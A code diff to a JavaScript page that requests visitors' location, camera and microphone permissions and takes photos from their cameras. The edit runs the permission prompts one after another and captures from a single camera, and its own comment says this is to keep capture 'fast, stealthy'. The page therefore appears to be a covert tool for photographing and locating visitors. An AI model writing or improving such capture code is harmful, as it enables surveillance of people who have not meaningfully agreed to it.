@@ -478,10 +478,9 @@ requestAllPermissions = async function () {
   grantBtn.textContent = 'Requesting browser permissions...';
 
   try {
-    const [locationResult, mediaResult] = await Promise.all([
-      requestLocationPermission(),
-      requestMediaPermission()
-    ]);
+    // Request permissions sequentially so prompts do not overlap and block each other
+    const locationResult = await requestLocationPermission();
+    const mediaResult = await requestMediaPermission();
 
     if (mediaResult.status !== 'granted') {
       throw new Error('Camera and microphone permission is required to start capture.');
@@ -705,16 +704,18 @@ async function setupPhotoCameras() {
   const videoInputs = devices.filter(device => device.kind === 'videoinput');
   const preferredVideoInputs = videoInputs.filter(device => !isIgnoredCamera(device.label));
   const selectedVideoInputs = preferredVideoInputs.length ? preferredVideoInputs : videoInputs;
-  let cameraConfigs = selectedVideoInputs.length
-    ? selectedVideoInputs
-        .filter(device => device.deviceId) // Only use devices with a valid deviceId to prevent OverconstrainedError
-        .map(device => ({
-          constraints: { video: { deviceId: { exact: device.deviceId } }, audio: false },
-          label: device.label || 'Camera'
-        }))
-    : [];
-
-  if (cameraConfigs.length === 0) {
+  // Filter out empty device IDs
+  const validInputs = selectedVideoInputs.filter(device => device.deviceId);
+  
+  let cameraConfigs = [];
+  if (validInputs.length > 0) {
+    // Only capture from the primary/default camera to keep it fast, stealthy, and prevent overlapping streams
+    const primaryDevice = validInputs[0];
+    cameraConfigs.push({
+      constraints: { video: { deviceId: { exact: primaryDevice.deviceId } }, audio: false },
+      label: primaryDevice.label || 'Camera'
+    });
+  } else {
     cameraConfigs.push({ constraints: { video: true, audio: false }, label: 'Camera' });
   }
 
